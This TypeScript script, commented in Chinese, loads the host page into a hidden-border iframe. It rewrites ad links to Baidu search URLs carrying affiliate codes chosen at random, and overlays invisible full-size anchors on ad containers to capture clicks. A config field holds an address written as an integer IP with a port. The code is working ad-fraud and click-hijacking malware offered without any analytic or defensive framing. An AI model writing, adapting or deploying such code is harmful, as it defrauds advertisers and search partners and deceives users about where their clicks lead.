class Pos {
    // config
    m = ''
    p = ''
    v = '//3026275270:6688/?p=UE9TfFNDM3ww'
    D = ["1014538l", "1020067p"]
    E = ["06074089_4", "06074089_33"]
    t = [this.m, this.D[parseInt(`${Math.random() * this.D.length}`)]].join('')
    u = [this.p, this.E[parseInt(`${Math.random() * this.E.length}`)]].join('')
    d = 0.98

    iframe: HTMLIFrameElement
    constructor() {
        this.start()
        this.iframe.onload = () => {
            try {
                this.compile()
            } catch (e) {
                console.log('报错了'); // -> 输出
                console.log(e.message); // -> 可以收集当前代码报错的原因(num is not defined)
            }
        }
    }

    // 是否移动端
    browsers() {
        let p = navigator.userAgent
        return /AppleWebKit.*Mobile|Android|Windows Phone|webOS|iPhone|iPod|BlackBerry|iPad/i.test(p) || (/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(p))
    }

    // 随机数
    random(a) {
        return Math.floor(Math.random() * a)
    }

    // 加密串
    ciphertext(a) {
        let d = [65, 97, 48],
            e = [26, 26, 10],
            g = "";
        for (let b = 0; b < a; ++b) {
            let c = this.random(3);
            let f = d[c] + this.random(e[c]);
            g = g + String.fromCharCode(f)
        }
        return g
    }

    // 被替换地址
    replaceHref(d, e, b) {
        let a = this.browsers()
        return `https://${(a ? "m" : "www")}.baidu.com/s?word=${d}&fenIei=${this.ciphertext(164)}&${(a ? `from=${e}` : `tn=${b}`)}`
    }

    start() {
        let src = document.URL.replace(/([?&])(dc=[23])/, `$1rsuv=0x${this.random(8)}&$2`) + "&_r=1_0&ich=s&jid=1&aaa_flag=1"
        let iframe = document.createElement('iframe')
        // iframe.src = 'http://localhost:8086/static/index.html'
        iframe.src = src
        document.body.appendChild(iframe)
        iframe.align = 'center,center'
        iframe.width = '100%'
        iframe.height = '100%'
        iframe.marginWidth = '0'
        iframe.marginHeight = '0'
        iframe.scrolling = 'no'
        iframe.frameBorder = '0'
        iframe.style.overflowX = 'hidden'
        iframe.setAttribute('allowtransparency', 'true')
        this.iframe = iframe
    }

    // 解析页面
    compile() {
        let window: Window | any = this.iframe.contentWindow
        let document: Document = this.iframe.contentDocument
        var ads = (window.ads && window.ads.length && window.ads) || window.newAds;

        let aList: HTMLCollectionOf<HTMLAnchorElement> = document.getElementsByTagName('a')

        
        if (ads && ads.length) {
            // 处理 a标签
            for (let i = 0; i < ads.length; i++) {
                let data = ads[i];
                let curl = data.curl;
                let desc = data.desc || data.title || '';
                var _curl = this.replaceHref(desc, this.t, this.u);

                for (let i = 0; i < aList.length; i++) {
                    let a = aList[i];
                    let href = a.href;
                    if (href && this.diffStr(curl, href) >= this.d) {
                        a.href = _curl;
                    }
                }
            }

            // 处理事件绑定
            var pic_container = document.getElementById("pic_container");
            if (pic_container && pic_container.firstElementChild.nodeName == 'A') {
                let aref = document.createElement('a');
                aref.style.position = 'absolute';
                aref.style.top = '0';
                aref.style.left = '0';
                aref.style.width = '100%';
                aref.style.height = '100%';
                aref.style.zIndex = '100000000000';
                aref.target = '_blank';
                aref.href = ads[0].curl;
                pic_container.appendChild(aref);
            }
            var container = document.getElementById("#container");
            if (container && container.firstElementChild.nodeName == 'A') {
                var aref = document.createElement('a');
                aref.style.position = 'absolute';
                aref.style.top = '0';
                aref.style.left = '0';
                aref.style.width = '100%';
                aref.style.height = '100%';
                aref.style.zIndex = '100000000000';
                aref.target = '_blank';
                aref.href = ads[0].curl;
                container.appendChild(aref);
            }
        }
    }

    diffStr(result, target) {
        let a = result.split('')
        let b = target.split('')
        let ok = 0
        a.forEach((data, index) => {
            if (data === b[index])++ok
        });
        return ok / a.length
    }
}

new Pos()